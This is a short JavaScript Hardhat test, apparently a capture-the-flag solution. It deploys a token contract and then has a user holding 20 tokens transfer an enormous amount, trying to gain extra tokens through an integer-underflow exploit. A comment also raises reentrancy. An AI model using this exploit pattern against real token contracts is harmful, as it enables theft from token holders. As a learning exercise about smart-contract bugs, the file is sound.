  const { expect } = require("chai");

  describe("Token", function () {

    let contract;
    let owner;

    this.beforeEach(async () => {
        [owner, user, user2] = await ethers.getSigners();

        const Token = await ethers.getContractFactory("Token");
        contract = await Token.connect(owner).deploy(10_000_000);
    })

    // @note can be tried to exploit the contract integer overflow or reentrancy attack ?

    describe("Token", function () {
      it("Should manage to get your hands on any additional tokens - interger overflow exploit", async function () {
        expect(await contract.totalSupply()).to.be.eq(10_000_000);
        expect(await contract.balanceOf(owner.address)).to.be.eq(10_000_000);
        
        await contract.transfer(user.address, 20);
        expect(await contract.balanceOf(owner.address)).to.be.eq(10_000_000 - 20);
        expect(await contract.balanceOf(user.address)).to.be.eq(20);
  
        await contract.connect(user).transfer(user2.address, 20_000_000_000_000_000_000_000_000n)
      });
    });
  });
  